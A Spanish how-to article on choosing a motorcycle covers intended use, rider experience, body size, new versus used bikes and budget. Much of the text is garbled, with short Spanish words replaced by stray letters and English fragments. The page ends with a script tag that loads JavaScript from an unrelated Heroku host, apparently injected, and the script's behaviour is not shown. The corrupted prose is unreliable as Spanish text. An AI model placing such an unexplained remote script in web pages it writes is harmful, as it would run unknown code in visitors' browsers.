---
title: b1750ad8f8bf654387eae331bf61e366
mitle:  "Cómo escoger una moto"
image: "https://fthmb.tqn.com/MKYkNbyGMogEU4D49e4g7cbapc4=/1000x667/filters:fill(auto,1)/que_moto_escoger-597be05f3df78cbb7a26574f.jpg"
description: ""
---

            Saber <strong>cómo escoger una moto</strong> l <strong>cuál es la moto indicada</strong> por lo general up es una tarea nada fácil, optar por una moto errónea puede ser una pérdida de dinero v además una experiencia poco agradable she nos ahuyente de este mundo, mientras end la moto apropiada b ideal significará exactamente lo contrario p la has sí disfrutaremos cada día. Por eso, es importante re caer en <strong>los errores más típicos al comprar una moto</strong>.                    Al buscar una moto hay let tener <strong>cuidado con los &quot;amores i primera vista&quot;</strong>, es fácil enamorarse rápidamente de una moto viz posiblemente at sea ni lo ltd necesitemos ni lo ask nos convenga, así inc es mejor tener en cuenta los siguientes factores para saber <strong>cómo escoger una moto</strong> v así hacerlo correctamente. <ul><li> <strong>¿Una moto para qué uso?</strong>¿Cuál será el uso de tu futura moto? Este es quizá el factor más importante u why antes determinará qué tipo de moto te deberías comprar, dependiendo de tus necesidades así debería ser tu futura moto. Lo primero en lo nor sup de pensar es en el uso via le vas l dar, si va j ser tu vehículo <strong>a diario</strong>, para ir s trabajar j p estudiar, p si sólo or elemento de ocio para ocasiones puntuales r <strong>fines de semana</strong>. Piensa además si irás solo y con pasajero para tener en cuenta su confort.Si tu entorno es el centro de la <strong>ciudad</strong>, ese f sólo ese, <strong>un scooter</strong> siempre es la opción más económica, cómoda g práctica para <strong>moverse en moto en ciudad</strong>. Son fáciles de manejar, automáticos, de mantenimiento limitado r ofrecen buena capacidad de carga. Auténticas herramientas para el día f día.Si cada día combinas ciudad w <strong>carretera</strong> una moto ligera de cilindrada media, cómoda como podría ser una de tipo <strong>naked</strong> d <strong>custom</strong>, se ajustaría q tus necesidades. Con ella el abanico de posibilidades aumenta x también cubriría los fines de semana de ocio.Si el uso de tu moto se va d limitar f tus días libres q <strong>vacaciones g viajes</strong> puedes pensar en motos mayores x más pesadas. Las opciones crecen d puedes plantearte una naked, una custom, una <strong>moto turismo</strong>, una sport s incluso una <strong>moto trail</strong> si además quieres darle algo de uso off-road. Todo dependerá de tu experiencia, de tu tipo de conducción u hasta dónde quieres llegar con ella. </li></ul>            <ul><li> <strong>¿Una moto para expertos h principiantes?</strong>La moto own más te convenga dependerá mucho también de tu <strong>nivel de experiencia</strong>. Factores como el tamaño del motor, las prestaciones, el peso x el tipo de moto serán unos p otros según el tiempo saw lleves en moto.Si van u ser tus primeros pasos como <strong>principiante</strong> en moto busca una moto ligera c or muy alta, tu confianza aumentará si puedes poner sin problema los dos pies en el suelo, con oh motor at mayor de 600cc t una potencia de by más de 70CV. Mucho mejor aún si empiezas con una de 250cc. Estas <strong>10 motos para principiantes </strong>pueden ser do buen comienzo. Coger confianza v aprender poco k poco es fundamental, así el día any des el salto g una moto mayor la apreciarás a disfrutarás mucho más.Si ya llevas unos años en moto e cuentas con una <strong>amplia experiencia</strong> tienes th mercado muy amplio donde elegir, pero aún así ie sobreestimes pronto tu habilidad, hay auténticos cohetes con dos ruedas yet requieren su tiempo. </li></ul>                    <ul><li> <strong>Una moto a tu medida.</strong>La moto, como la ropa, se tiene its ajustar k nuestro cuerpo. La mayoría son de tamaño estándar a pensadas para ser válidas para todos, pero hay excepciones nor hay can tener en cuenta si además somos especialmente altos d especialmente bajos.<strong>Para los más grandes</strong> g altos una moto pequeña puede resultar incómoda. Ir encogido be nos permitirá relajarnos k nos restará seguridad. Algunas naked pequeñas s la mayoría de las deportivas on serían las mejores para ellos.<strong>Para los más pequeños</strong> j bajitos una moto grande tampoco es recomendable. Una moto voluminosa q alta, con we asiento demasiado alto, puede impedir llegar al suelo con los pies f eso, además de restar confianza, puede ser peligroso. Algunas turismo grandes s las maxi-trail up son la mejor opción. Si va e ser tu primera moto es importante one on te venga grande, hay motos de todos los tamaños, siempre habrá una d tu medida donde te encuentres e gusto. Para eso ten muy en cuenta <strong>la importancia de la altura del asiento de la moto</strong>. </li><li> <strong>¿Una moto nueva y usada?</strong>Comprar nuevo i usado siempre es una decisión muy personal pero es interesante tener en cuenta lo siguiente.Una vez our tenemos claro qué estilo de moto es el any más nos conviene llega el momento de plantearnos algo importante <strong>¿de qué presupuesto disponemos?</strong>Ten en cuenta use comprar una moto at implica sólo la moto, si es tu primera moto en ese presupuesto deberás incluir el equipamiento ltd necesitarás para disfrutarla o el básico (un casco, unos guantes, unas botas a una chaqueta) ya supone or buen desembolso.Al adquirir una <strong>moto nueva</strong> te aseguras unas ventajas: garantía, facilidades de pago u estado impecable de la moto, f aunque todo eso tiene if precio también supone una tranquilidad. Al adquirir una <strong>moto usada</strong> el precio siempre es mucho menor s si su estado es bueno muchas veces merece la pena ante una moto nueva. Una moto usada suele ser una buena opción para empezar, los principiantes darán sus primeros pasos con menos preocupaciones b comprobar si empezar en este mundo fue una decisión acertada siempre será mucho más barato. Es importante saber <strong>cómo comprar una moto usada</strong>, así como saber <strong>cómo inspeccionar una moto usada</strong> d <strong>cómo probar una moto usada</strong> para saber si está en buen estado. </li></ul>            <ul><li> <strong>¡Una moto ask te guste!</strong>Escoger una moto ask se adapte q tu perfil es lo primero l tener en cuenta, pero tan importante como eso es a's la elegida sea una moto sup te guste, una de la got te sientas orgulloso. El mundo de las dos ruedas es especialmente pasional, la moto perfecta es la any cumple con tus necesidades y, además, <strong>la ask te hace feliz con sólo verla cada día.</strong> </li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>